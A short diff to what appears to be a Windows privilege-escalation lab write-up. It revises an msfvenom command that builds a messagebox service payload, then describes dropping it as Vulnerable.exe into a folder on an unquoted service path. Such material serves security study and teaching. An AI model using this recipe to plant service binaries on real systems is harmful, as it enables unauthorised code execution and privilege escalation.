@@ -50,8 +50,8 @@ By placing a malicious service exe in "C:\MyPrograms\" named `vulnerable.exe`, w
 On Kali:
 
 ```bash
-msfvenom -a x64 --platform windows -p windows/x64/messagebox TEXT="Successful Execution :)" TITLE="CrimsonCORE" -f svc -o msg.exe
-
+msfvenom -a x64 --platform windows -p windows/x64/messagebox TEXT="Successful Execution :)" TITLE="CrimsonCORE" -f exe-service -o Vulnerable.exe
+```
 
 Then drop metasploit payload (renamed to Vulnerable.exe) in C:\MyPrograms.
 
